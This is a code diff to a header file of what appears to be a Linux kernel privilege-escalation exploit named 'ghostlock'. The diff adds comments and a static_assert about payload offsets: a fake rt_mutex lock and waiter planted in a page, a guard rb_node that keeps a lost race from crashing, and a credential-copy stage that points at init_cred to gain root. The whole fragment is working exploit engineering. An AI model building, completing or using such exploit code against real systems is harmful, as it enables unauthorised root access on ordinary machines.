@@ -31,7 +31,17 @@ namespace ghostlock::target {
         inline constexpr std::size_t kFakeTaskOffset = 0x1280;
         /* Holds a self-consistent black rb_node so a lost race that walks the
          * page-derived write value as a tree node ends the walk instead of
-         * dereferencing a zero grandparent (see util.cpp, payload planting). */
+         * dereferencing a zero grandparent (see util.cpp, payload planting).
+         *
+         * Note this is NOT the node the enqueue path walks: rt_mutex_top_waiter()
+         * returns rb_entry(lock->waiters.rb_leftmost, rt_mutex_waiter, tree_entry)
+         * and the fake lock plants rb_leftmost = fake_w0, so the word the walk
+         * reads is page_base + kWaiterOffset (0x300), which the waiter block
+         * writes to 1. This carpet is the second line of defence for paths that
+         * follow a page-derived value directly (layout.right). It also sits at
+         * kCredentialCopyOffset in payload space (0xe80 + 0x200 = 0x1080), so
+         * W2's credential copy overwrites it -- W2 points layout.right at
+         * init_cred instead, which is why that has never mattered. */
         inline constexpr std::size_t kRelinkNodeOffset = 0x0200;
         inline constexpr std::size_t kCredentialCopyOffset = 0x1080;
         inline constexpr std::size_t kTcpFakeTaskOffset = 0x5800;
@@ -93,6 +103,10 @@ namespace ghostlock::target {
     static_assert(payload::kFakeTaskOffset == 0x1280);
     static_assert(payload::kTcpFakeTaskOffset == 0x5800);
     static_assert(payload::kTcpCredentialCopyOffset == 0x6800);
+    /* The carpet and the fake waiter are different words: the enqueue path walks
+     * page_base + kWaiterOffset, the carpet covers direct page-derived values. */
+    static_assert(payload::kLockOffset + payload::kRelinkNodeOffset ==
+                  payload::kCredentialCopyOffset);
 } // namespace ghostlock::target
 
 #endif
